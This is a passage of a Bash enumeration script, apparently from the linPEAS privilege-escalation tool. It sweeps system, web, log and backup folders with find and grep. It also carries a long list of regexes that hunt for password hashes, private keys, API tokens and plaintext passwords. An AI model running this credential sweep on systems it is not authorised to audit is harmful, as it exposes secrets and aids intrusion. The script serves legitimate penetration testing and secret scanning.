        timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        
        # Search in opt
        timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        
        # Search in possible web folders (usually only 1 will exist)
        timeout 120 find /var/www /usr/local/www /usr/share/nginx /Library/WebServer/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        
        # Search in logs
        timeout 120 find /var/log /var/logs /Library/Logs -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        
        # Search in backups
        timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
        
        # Search in others folders (usually only /srv or /Applications will exist)
        timeout 120 find /tmp /srv /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE$i "$regex" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
    fi
    wait
    printf "\033[2K\r"
}



if [ "$REGEXES" ] && [ "$TIMEOUT" ]; then
        print_2title "Searching Hashed Passwords"
    search_for_regex "Apr1 MD5" "\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" 
    search_for_regex "Apache SHA" "\{SHA\}[0-9a-zA-Z/_=]{10,}" 
    search_for_regex "Blowfish" "\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*" 
    search_for_regex "Drupal" "\$S\$[a-zA-Z0-9_/\.]{52}" 
    search_for_regex "Joomlavbulletin" "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}" 
    search_for_regex "Linux MD5" "\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}" 
    search_for_regex "phpbb3" "\$H\$[a-zA-Z0-9_/\.]{31}" 
    search_for_regex "sha512crypt" "\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}" 
    search_for_regex "Wordpress" "\$P\$[a-zA-Z0-9_/\.]{31}" 
    echo ''

    print_2title "Searching Raw Hashes"
    search_for_regex "sha512" "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" 
    echo ''

    print_2title "Searching APIs"
    search_for_regex "Adobe Client Id (Oauth Web)" "(adobe[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{32})['\"]" 1
    search_for_regex "Abode Client Secret" "(p8e-)[a-z0-9]{32}" 1
    search_for_regex "Age Secret Key" "AGE-SECRET-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58}" 
    search_for_regex "Airtable API Key" "[\"']?air[-_]?table[-_]?api[-_]?key[\"']?[=:][\"']?.+[\"']\"" 
    search_for_regex "Alchemi API Key" "(alchemi[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9-]{32})['\"]" 1
    search_for_regex "Alibaba Access Key ID" "(LTAI)[a-z0-9]{20}" 1
    search_for_regex "Alibaba Secret Key" "(alibaba[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{30})['\"]" 1
    search_for_regex "Artifactory API Key & Password" "[\"']AKC[a-zA-Z0-9]{10,}[\"']|[\"']AP[0-9ABCDEF][a-zA-Z0-9]{8,}[\"']" 
    search_for_regex "Asana Client ID" "((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9]{16})['\"])|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"])" 1
    search_for_regex "Atlassian API Key" "(atlassian[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{24})['\"]" 1
    search_for_regex "AWS Client ID" "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" 
    search_for_regex "AWS MWS Key" "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" 
    search_for_regex "AWS Secret Key" "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" 
    search_for_regex "AWS AppSync GraphQL Key" "da2-[a-z0-9]{26}" 
    search_for_regex "Basic Auth Credentials" "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" 
    search_for_regex "Beamer Client Secret" "(beamer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"](b_[a-z0-9=_\-]{44})['\"]" 1
    search_for_regex "Binance API Key" "(binance[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{64})['\"]" 1
    search_for_regex "Bitbucket Client Id" "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"])" 1
    search_for_regex "Bitbucket Client Secret" "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9_\-]{64})['\"])" 1
    search_for_regex "BitcoinAverage API Key" "(bitcoin.?average[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{43})['\"]" 1
    search_for_regex "Bitquery API Key" "(bitquery[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Za-z0-9]{32})['\"]" 1
    search_for_regex "Birise API Key" "(bitrise[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9_\-]{86})['\"]" 1
    search_for_regex "Block API Key" "(block[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})['\"]" 1
    search_for_regex "Blockchain API Key" "mainnet[a-zA-Z0-9]{32}|testnet[a-zA-Z0-9]{32}|ipfs[a-zA-Z0-9]{32}" 
    search_for_regex "Blockfrost API Key" "(blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['\"]" 1
    search_for_regex "Box API Key" "(box[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{32})['\"]" 1
    search_for_regex "Bravenewcoin API Key" "(bravenewcoin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{50})['\"]" 1
    search_for_regex "Clearbit API Key" "sk_[a-z0-9]{32}" 
    search_for_regex "Clojars API Key" "(CLOJARS_)[a-zA-Z0-9]{60}" 
    search_for_regex "Cloudinary Basic Auth" "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" 
    search_for_regex "Coinlayer API Key" "(coinlayer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
    search_for_regex "Coinlib API Key" "(coinlib[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{16})['\"]" 1
    search_for_regex "Contentful delivery API Key" "(contentful[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9=_\-]{43})['\"]" 1
    search_for_regex "Covalent API Key" "ckey_[a-z0-9]{27}" 
    search_for_regex "Charity Search API Key" "(charity.?search[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
    search_for_regex "Databricks API Key" "dapi[a-h0-9]{32}" 
    search_for_regex "DDownload API Key" "(ddownload[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{22})['\"]" 1
    search_for_regex "Defined Networking API token" "(dnkey-[a-z0-9=_\-]{26}-[a-z0-9=_\-]{52})" 
    search_for_regex "Discord API Key, Client ID & Client Secret" "((discord[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-h0-9]{64}|[0-9]{18}|[a-z0-9=_\-]{32})['\"])" 1
    search_for_regex "Dropbox API Key" "sl.[a-zA-Z0-9_-]{136}" 
    search_for_regex "Doppler API Key" "(dp\.pt\.)[a-zA-Z0-9]{43}" 
    search_for_regex "Dropbox API secret/key, short & long lived API Key" "(dropbox[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{15}|sl\.[a-z0-9=_\-]{135}|[a-z0-9]{11}(AAAAAAAAAA)[a-z0-9_=\-]{43})['\"]" 1
    search_for_regex "Duffel API Key" "duffel_(test|live)_[a-zA-Z0-9_-]{43}" 
    search_for_regex "Dynatrace API Key" "dt0c01\.[a-zA-Z0-9]{24}\.[a-z0-9]{64}" 
    search_for_regex "EasyPost API Key" "EZAK[a-zA-Z0-9]{54}" 
    search_for_regex "EasyPost test API Key" "EZTK[a-zA-Z0-9]{54}" 
    search_for_regex "Etherscan API Key" "(etherscan[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Z0-9]{34})['\"]" 
    search_for_regex "Facebook Access Token" "EAACEdEose0cBA[0-9A-Za-z]+" 
    search_for_regex "Facebook Client ID" "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" 
    search_for_regex "Facebook Oauth" "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]" 
    search_for_regex "Facebook Secret Key" "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9a-f]{32}" 
    search_for_regex "Fastly API Key" "(fastly[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9=_\-]{32})['\"]" 1
    search_for_regex "Finicity API Key & Client Secret" "(finicity[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{32}|[a-z0-9]{20})['\"]" 1
    search_for_regex "Flutterweave Keys" "FLWPUBK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST[a-hA-H0-9]{12}" 
    search_for_regex "Frame.io API Key" "fio-u-[a-zA-Z0-9_=\-]{64}" 
    search_for_regex "Github" "github(.{0,20})?['\"][0-9a-zA-Z]{35,40}" 
    search_for_regex "Github App Token" "(ghu|ghs)_[0-9a-zA-Z]{36}" 
    search_for_regex "Github OAuth Access Token" "gho_[0-9a-zA-Z]{36}" 
    search_for_regex "Github Personal Access Token" "ghp_[0-9a-zA-Z]{36}" 
    search_for_regex "Github Refresh Token" "ghr_[0-9a-zA-Z]{76}" 
    search_for_regex "GitHub Fine-Grained Personal Access Token" "github_pat_[0-9a-zA-Z_]{82}" 
    search_for_regex "Gitlab Personal Access Token" "glpat-[0-9a-zA-Z\-]{20}" 
    search_for_regex "GitLab Pipeline Trigger Token" "glptt-[0-9a-f]{40}" 
    search_for_regex "GitLab Runner Registration Token" "GR1348941[0-9a-zA-Z_\-]{20}" 
    search_for_regex "GoCardless API Key" "live_[a-zA-Z0-9_=\-]{40}" 
    search_for_regex "GoFile API Key" "(gofile[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{32})['\"]" 1
    search_for_regex "Google API Key" "AIza[0-9A-Za-z_\-]{35}" 
    search_for_regex "Google Cloud Platform API Key" "(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z_\-]{35}]['\"]" 
    search_for_regex "Google Drive Oauth" "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" 
    search_for_regex "Google Oauth Access Token" "ya29\.[0-9A-Za-z_\-]+" 
    search_for_regex "Google (GCP) Service-account" "\"type.+:.+\"service_account" 
    search_for_regex "Grafana API Key" "eyJrIjoi[a-z0-9_=\-]{72,92}" 1
    search_for_regex "Grafana cloud api token" "glc_[A-Za-z0-9\+/]{32,}={0,2}" 
    search_for_regex "Grafana service account token" "(glsa_[A-Za-z0-9]{32}_[A-Fa-f0-9]{8})" 
    search_for_regex "Hashicorp Terraform user/org API Key" "[a-z0-9]{14}\.atlasv1\.[a-z0-9_=\-]{60,70}" 
    search_for_regex "Heroku API Key" "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}" 
    search_for_regex "Hubspot API Key" "['\"][a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12}['\"]" 1
    search_for_regex "Instatus API Key" "(instatus[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
    search_for_regex "Intercom API Key & Client Secret/ID" "(intercom[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9=_]{60}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['\"]" 1
    search_for_regex "Ionic API Key" "(ionic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"](ion_[a-z0-9]{42})['\"]" 1
    search_for_regex "Jenkins Creds" "<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" 
    search_for_regex "JSON Web Token" "(ey[0-9a-z]{30,34}\.ey[0-9a-z\/_\-]{30,}\.[0-9a-zA-Z\/_\-]{10,}={0,2})" 
    search_for_regex "Kraken Access Token" "([a-z0-9\/=_\+\-]{80,90})" 
    search_for_regex "Kucoin Secret Key" "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" 
    search_for_regex "Linear API Key" "(lin_api_[a-zA-Z0-9]{40})" 
    search_for_regex "Linear Client Secret/ID" "((linear[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-f0-9]{32})['\"])" 
    search_for_regex "LinkedIn Client ID" "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" 
    search_for_regex "LinkedIn Secret Key" "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" 
    search_for_regex "Lob API Key" "((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]((live|test)_[a-f0-9]{35})['\"])|((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]((test|live)_pub_[a-f0-9]{31})['\"])" 1
    search_for_regex "Lob Publishable API Key" "((test|live)_pub_[a-f0-9]{31})" 
    search_for_regex "MailboxValidator" "(mailbox.?validator[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Z0-9]{20})['\"]" 1
    search_for_regex "Mailchimp API Key" "[0-9a-f]{32}-us[0-9]{1,2}" 
    search_for_regex "Mailgun API Key" "key-[0-9a-zA-Z]{32}'" 
    search_for_regex "Mailgun Public Validation Key" "pubkey-[a-f0-9]{32}" 
    search_for_regex "Mailgun Webhook signing key" "[a-h0-9]{32}-[a-h0-9]{8}-[a-h0-9]{8}" 
    search_for_regex "Mapbox API Key" "(pk\.[a-z0-9]{60}\.[a-z0-9]{22})" 1
    search_for_regex "MessageBird API Key & API client ID" "(messagebird[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{25}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['\"]" 1
    search_for_regex "Microsoft Teams Webhook" "https:\/\/[a-z0-9]+\.webhook\.office\.com\/webhookb2\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}@[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}\/IncomingWebhook\/[a-z0-9]{32}\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}" 
    search_for_regex "New Relic User API Key, User API ID & Ingest Browser API Key" "(NRAK-[A-Z0-9]{27})|((newrelic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Z0-9]{64})['\"])|(NRJS-[a-f0-9]{19})" 
    search_for_regex "Nownodes" "(nownodes[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Za-z0-9]{32})['\"]" 
    search_for_regex "Npm Access Token" "(npm_[a-zA-Z0-9]{36})" 
    search_for_regex "OpenAI API Token" "sk-[A-Za-z0-9]{48}" 
    search_for_regex "ORB Intelligence Access Key" "['\"][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['\"]" 
    search_for_regex "Pastebin API Key" "(pastebin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{32})['\"]" 1
    search_for_regex "PayPal Braintree Access Token" "access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}" 
    search_for_regex "Picatic API Key" "sk_live_[0-9a-z]{32}" 
    search_for_regex "Pinata API Key" "(pinata[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{64})['\"]" 1
    search_for_regex "Planetscale API Key" "pscale_tkn_[a-zA-Z0-9_\.\-]{43}" 
    search_for_regex "PlanetScale OAuth token" "(pscale_oauth_[a-zA-Z0-9_\.\-]{32,64})" 
    search_for_regex "Planetscale Password" "pscale_pw_[a-zA-Z0-9_\.\-]{43}" 
    search_for_regex "Plaid API Token" "(access-(?:sandbox|development|production)-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" 
    search_for_regex "Prefect API token" "(pnu_[a-z0-9]{36})" 
    search_for_regex "Postman API Key" "PMAK-[a-fA-F0-9]{24}-[a-fA-F0-9]{34}" 
    search_for_regex "Private Keys" "\-\-\-\-\-BEGIN PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN RSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN OPENSSH PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN PGP PRIVATE KEY BLOCK\-\-\-\-\-|\-\-\-\-\-BEGIN DSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN EC PRIVATE KEY\-\-\-\-\-" 
    search_for_regex "Pulumi API Key" "pul-[a-f0-9]{40}" 
    search_for_regex "PyPI upload token" "pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}" 
    search_for_regex "Quip API Key" "(quip[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-zA-Z0-9]{15}=\|[0-9]{10}\|[a-zA-Z0-9\/+]{43}=)['\"]" 1
    search_for_regex "Rubygem API Key" "rubygems_[a-f0-9]{48}" 
    search_for_regex "Readme API token" "rdme_[a-z0-9]{70}" 
    search_for_regex "Sendbird Access ID" "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})" 
    search_for_regex "Sendgrid API Key" "SG\.[a-zA-Z0-9_\.\-]{66}" 
    search_for_regex "Sendinblue API Key" "xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}" 
    search_for_regex "Shippo API Key, Access Token, Custom Access Token, Private App Access Token & Shared Secret" "shippo_(live|test)_[a-f0-9]{40}|shpat_[a-fA-F0-9]{32}|shpca_[a-fA-F0-9]{32}|shppa_[a-fA-F0-9]{32}|shpss_[a-fA-F0-9]{32}" 
    search_for_regex "Sidekiq Secret" "([a-f0-9]{8}:[a-f0-9]{8})" 
    search_for_regex "Sidekiq Sensitive URL" "([a-f0-9]{8}:[a-f0-9]{8})@(?:gems.contribsys.com|enterprise.contribsys.com)" 
    search_for_regex "Slack Token" "xox[baprs]-([0-9a-zA-Z]{10,48})?" 
    search_for_regex "Slack Webhook" "https://hooks.slack.com/services/T[a-zA-Z0-9_]{10}/B[a-zA-Z0-9_]{10}/[a-zA-Z0-9_]{24}" 
    search_for_regex "Smarksheel API Key" "(smartsheet[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{26})['\"]" 1
    search_for_regex "Square Access Token" "sqOatp-[0-9A-Za-z_\-]{22}" 
    search_for_regex "Square API Key" "EAAAE[a-zA-Z0-9_-]{59}" 
    search_for_regex "Square Oauth Secret" "sq0csp-[ 0-9A-Za-z_\-]{43}" 
    search_for_regex "Stytch API Key" "secret-.*-[a-zA-Z0-9_=\-]{36}" 
    search_for_regex "Stripe Access Token & API Key" "(sk|pk)_(test|live)_[0-9a-z]{10,32}|k_live_[0-9a-zA-Z]{24}" 1
    search_for_regex "Telegram Bot API Token" "[0-9]+:AA[0-9A-Za-z\\-_]{33}" 
    search_for_regex "Trello API Key" "(trello[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-z]{32})['\"]" 
    search_for_regex "Twilio API Key" "SK[0-9a-fA-F]{32}" 
    search_for_regex "Twitch API Key" "(twitch[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([a-z0-9]{30})['\"]" 
    search_for_regex "Twitter Client ID" "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" 
    search_for_regex "Twitter Bearer Token" "(A{22}[a-zA-Z0-9%]{80,100})" 
    search_for_regex "Twitter Oauth" "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" 
    search_for_regex "Twitter Secret Key" "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" 
    search_for_regex "Typeform API Key" "tfp_[a-z0-9_\.=\-]{59}" 
    search_for_regex "URLScan API Key" "['\"][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['\"]" 
    search_for_regex "Yandex Access Token" "(t1\.[A-Z0-9a-z_-]+[=]{0,2}\.[A-Z0-9a-z_-]{86}[=]{0,2})" 
    search_for_regex "Yandex API Key" "(AQVN[A-Za-z0-9_\-]{35,38})" 
    search_for_regex "Yandex AWS Access Token" "(YC[a-zA-Z0-9_\-]{38})" 
    search_for_regex "Web3 API Key" "(web3[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([A-Za-z0-9_=\-]+\.[A-Za-z0-9_=\-]+\.?[A-Za-z0-9_.+/=\-]*)['\"]" 1
    echo ''

    print_2title "Searching Misc"
    search_for_regex "Generic Secret" "[sS][eE][cC][rR][eE][tT].*['\"][0-9a-zA-Z]{32,45}['\"]" 
    search_for_regex "Basic Auth" "//(.+):(.+)@" 
    search_for_regex "Code asigning passwords" "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass|pass').*[=:].+" 
    search_for_regex "PHP defined password" "define ?\(['\"](\w*pass|\w*pwd|\w*user|\w*datab)" 
    search_for_regex "Config Secrets" "passwd.*|creden.*|^kind:[^a-zA-Z0-9_]?Secret|[^a-zA-Z0-9_]env:|secret:|secretName:|^kind:[^a-zA-Z0-9_]?EncryptionConfiguration|\-\-encryption\-provider\-config" 
    search_for_regex "Simple Passwords" "passw.*[=:].+" 
    search_for_regex "Generiac API tokens search (A-C)" "(access_key|access_token|account_sid|admin_email|admin_pass|admin_user|adzerk_api_key|algolia_admin_key|algolia_api_key| algolia_search_key|alias_pass|alicloud_access_key|alicloud_secret_key|amazon_bucket_name|amazon_secret_access_key| amazonaws|anaconda_token|android_docs_deploy_token|ansible_vault_password|aos_key|aos_sec| api_key|api_key_secret|api_key_sid|api_secret|apiary_api_key|apigw_access_token|api.googlemaps|AIza|apidocs| apikey|apiSecret|app_bucket_perm|appclientsecret|app_debug|app_id|appkey|appkeysecret|app_key|app_log_level|app_report_token_key| app_secret|app_token|apple_id_password|application_key|appsecret|appspot|argos_token|artifactory_key|artifacts_aws_access_key_id| artifacts_aws_secret_access_key|artifacts_bucket|artifacts_key|artifacts_secret|assistant_iam_apikey|auth0_api_clientsecret| auth0_client_secret|auth_token|authorizationToken|author_email_addr|author_npm_api_key|authsecret|awsaccesskeyid|aws_access| aws_access_key|aws_access_key_id|aws_bucket|aws_config_accesskeyid|aws_key|aws_secret|aws_secret_access_key|awssecretkey| aws_secret_key|aws_secrets|aws_ses_access_key_id|aws_ses_secret_access_key|aws_token|awscn_access_key_id|awscn_secret_access_key| AWSSecretKey|b2_app_key|b2_bucket|bashrc password|bintray_api_key|bintray_apikey|bintray_gpg_password|bintray_key| bintray_token|bintraykey|bluemix_api_key|bluemix_auth|bluemix_pass|bluemix_pass_prod|bluemix_password|bluemix_pwd|bluemix_username brackets_repo_oauth_token|browser_stack_access_key|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id| bucketeer_aws_secret_access_key|built_branch_deploy_key|bundlesize_github_token|bx_password|bx_username|cache_driver| cache_s3_secret_key|cargo_token|cattle_access_key|cattle_agent_instance_auth|cattle_secret_key|censys_secret|certificate_password| cf_password|cheverny_token|chrome_client_secret|chrome_refresh_token|ci_deploy_password|ci_project_url|ci_registry_user| ci_server_name|ci_user_token|claimr_database|claimr_db|claimr_superuser|claimr_token|cli_e2e_cma_token|client_secret| client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key| cloudant_archived_database|cloudant_audited_database|cloudant_database|cloudant_instance|cloudant_order_database| cloudant_parsed_database|cloudant_password|cloudant_processed_database|cloudant_service_database| cloudflare_api_key|cloudflare_auth_email|cloudflare_auth_key|cloudflare_email|cloudinary_api_secret|cloudinary_name| cloudinary_url|cloudinary_url_staging|clu_repo_url|clu_ssh_private_key_base64|cn_access_key_id|cn_secret_access_key| cocoapods_trunk_email|cocoapods_trunk_token|codacy_project_token|codeclimate_repo_token|codecov_token|coding_token| conekta_apikey|conn.login|connectionstring|consumerkey|consumer_key|consumer_secret|contentful_access_token| contentful_cma_test_token|contentful_integration_management_token|contentful_integration_management_token| contentful_management_api_access_token|contentful_management_api_access_token_new|contentful_php_management_test_token| contentful_test_org_cma_token|contentful_v2_access_token|conversation_password|conversation_username|cos_secrets| coveralls_api_token|coveralls_repo_token|coveralls_token|coverity_scan_token|credentials| cypress_record_key)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z_=\-]{8,64})['\"]" 
    search_for_regex "Generiac API tokens search (D-H)" "(danger_github_api_token|database_host|database_name|database_password|database_port|database_schema_test| database_user|database_username|datadog_api_key|datadog_app_key|db_connection|db_database|db_host|db_password| db_pw|db_server|db_user|db_username|dbpasswd|dbpassword|dbuser|ddg_test_email|ddg_test_email_pw|ddgc_github_token| deploy_password|deploy_secure|deploy_token|deploy_user|dgpg_passphrase|digitalocean_access_token| digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd| docker_password|docker_postgres_url|docker_token|dockerhub_password|dockerhubpassword|doordash_auth_token| dot-files|dotfiles|dropbox_oauth_bearer|droplet_travis_password|dsonar_login|dsonar_projectkey|dynamoaccesskeyid| dynamosecretaccesskey|elastic_cloud_auth|elastica_host|elastica_port|elasticsearch_password|encryption_key| encryption_password|end_user_password|env_github_oauth_token|env_heroku_api_key|env_key|env_secret|env_secret_access_key| env_sonatype_password|eureka_awssecretkey|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey|exp_password| file_password|firebase_api_json|firebase_api_token|firebase_key|firebase_project_develop|firebase_token|firefox_secret| flask_secret_key|flickr_api_key|flickr_api_secret|fossa_api_key|ftp_host|ftp_login|ftp_password|ftp_pw|ftp_user|ftp_username| gcloud_bucket|gcloud_project|gcloud_service_key|gcr_password|gcs_bucket|gh_api_key|gh_email|gh_next_oauth_client_secret| gh_next_unstable_oauth_client_id|gh_next_unstable_oauth_client_secret|gh_oauth_client_secret|gh_oauth_token|gh_repo_token| gh_token|gh_unstable_oauth_client_secret|ghb_token|ghost_api_key|git_author_email|git_author_name|git_committer_email| git_committer_name|git_email|git_name|git_token|github_access_token|github_api_key|github_api_token|github_auth|github_auth_token| 